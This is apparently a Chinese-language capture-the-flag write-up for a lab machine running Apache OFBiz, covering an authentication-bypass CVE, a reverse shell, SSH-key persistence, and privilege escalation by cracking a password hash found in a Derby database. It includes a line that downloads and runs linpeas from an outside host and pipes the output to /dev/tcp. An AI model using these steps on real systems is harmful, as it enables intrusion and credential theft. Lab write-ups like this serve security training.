    Shell as User - ofbiz

    CVE-2023-49070 and CVE-2023-51467`

    发现最近出现的漏洞，尝试利用

    https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass - 首先确定 jdk 版本，Linux 需要 openjdk11 sudo apt install openjdk-11-jdk - 管道符似乎会失效，可以命令分段执行，也可以通过 nc 反弹 - 添加公钥，ssh 访问 

    echo '[Public key]' >> ~/.ssh/authorized_keys

    Shell as Root

    • 跑一下 Linpeas 
      curl http://10.10.16.2/linpeas.sh | sh > /dev/tcp/10.10.16.2/2233
    • 发现可写入服务 但是对应的进程运行用户是 ofbiz，暂时忽略
    • 发现 Capabilities 尝试利用 - 失败（可能是我太菜了）
    • 尝试 sudo 权限，提示需要密码 ofbiz 页面需要登陆，尝试寻找 ofbiz 连接的数据库以及密码，发现 derby 数据库
    • 查找关键词 find / -name '*derby*' 2>/dev/null 在 /opt/ofbiz/runtime/data/ 路径查找密码 
      grep -onr 'assw' |                           # 找到包含 assw 的文件
awk -F ':' '{print $1}' |                    # 提取文件名
sort -u |                                    # 去重
while read line; do strings $line; done |    # 打印所有文件的可打印字符
grep assw -C 1                               # 打印字符串中包含 assw 的上下文
      最终发现一个疑似密码 Hash 的东西 $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
    • 查看 ofbiz 源代码

      https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java#L143

    发现 Hash 的格式为 $[Hash类型]$[盐]$[Hash的base64-Url]编码 因此首先将 base64 编码后的内容转化为 Hash 值，后再和盐一起尝试爆破 - 得到的 Hash 

    b8fd3f41a541a435857a8f3e751cc3a91c174362:d
    - 结合实际情况，使用 hashcat 110 和 120 模式尝试爆破 得到密码 - 尝试执行 sudo - 密码错误，尝试登录 root 成功
